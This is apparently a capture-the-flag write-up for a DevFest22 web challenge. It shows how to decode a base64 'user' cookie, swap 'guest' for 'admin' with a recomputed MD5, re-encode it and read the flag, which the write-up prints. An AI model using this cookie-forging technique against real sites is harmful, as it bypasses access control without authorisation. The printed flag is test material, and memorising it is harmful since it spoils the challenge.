# BiScU1tS

## Write-Up

When you see the description, talking about buiscuits is mainly a references to cookies part of the website.

So when accessing the website http://devfest22-cybersec.gdgalgiers.com:1602, in the cookies section, you can find the following cookies :

```
devfest22_wtm_challenges_session: eyJpdiI6IkswU3FXT3BwTWludng5b0hkYnpyK2c9PSIsInZhbHVlIjoicVo4anNkY1hZb1dJWmo1Y0RmVGhDVWlOelJzd2xqNU5QQlM2ZUsvb1lvQStmQlQ1eUtTTXhmY2dkUkpoWlFDbzR6NCtDaTEyQ0p4VjlZUGtHS0xqaXlyVDVwYUgycFA2ZDRQYm9MaGlZR2ZrRzFBQVcrVjc1N1B3S3VJYlcvMzQiLCJtYWMiOiI2OTU0ZmE0YzlhYjU3MmRlYmRiZWFmOGNjN2YzMTkwMzAyNGUyNGNhZDlmYmVhYjQ0ZWEzMjQ0MjdmOTcxYmNkIiwidGFnIjoiIn0%3D

user: e3VzZXI6Z3Vlc3QsbWQ1KHVzZXIpOjA4NGUwMzQzYTA0ODZmZjA1NTMwZGY2YzcwNWM4YmI0fQ==

XSRF-Token: eyJpdiI6IlhrbVZJa0orWXFFa0ErTkM3SzZITkE9PSIsInZhbHVlIjoiOFJnMytLTldVakg3Mlg2blRhYW1ZdGZTWTBtbUMySndrQXhzY0NsRUxaU2tNSHV6TlkxRVZhRTBubWtSKzZjeDE1M3JIUW51Z1U5YWxWYjFqUSswamJBbUQ2NlJVNC9CcG1hdWNaK0FmTFdmZDI2dnJlUElWak84d2lJREdRcnEiLCJtYWMiOiI3MzA0NDIxNDY2MDAxM2JiOTViODNkN2U1NmQ2NmIzMTM3ZGNlMGFmY2I2YzZjODNjNjBlYzAzYmI0YjZiNTJkIiwidGFnIjoiIn0%3D
```

when seeing the user, you will see it coded in base64, after decoding it you will get :

```
echo "e3VzZXI6Z3Vlc3QsbWQ1KHVzZXIpOjA4NGUwMzQzYTA0ODZmZjA1NTMwZGY2YzcwNWM4YmI0fQ==" | base64 -d
```

```
{user:guest,md5(user)\:084e0343a0486ff05530df6c705c8bb4}
```

Now, we need to change the `user` from `guest` to `admin`. We need also to fix the md5 :

 - Get mdr5 of the `admin` value via this website : https://www.md5hashgenerator.com/
 - Replace the values with the new ones.
 - Encode the result into base64 again.

```
echo -n "{user:admin,md5(user):21232f297a57a5a743894a0e4a801fc3}" | base64
```

**Note :** Note that echo adds a `\n` at the end of the encoded string, make sur to use `-n` option to get rid of it

Here is the result :

```
e3VzZXI6YWRtaW4sbWQ1KHVzZXIpOjIxMjMyZjI5N2E1N2E1YTc0Mzg5NGEwZTRhODAxZmMzfQ==
```

All you have to do now is to change the cookie value of `user` and refresh to get the flag

## Flag

DevFest22{KOoOK132_1337}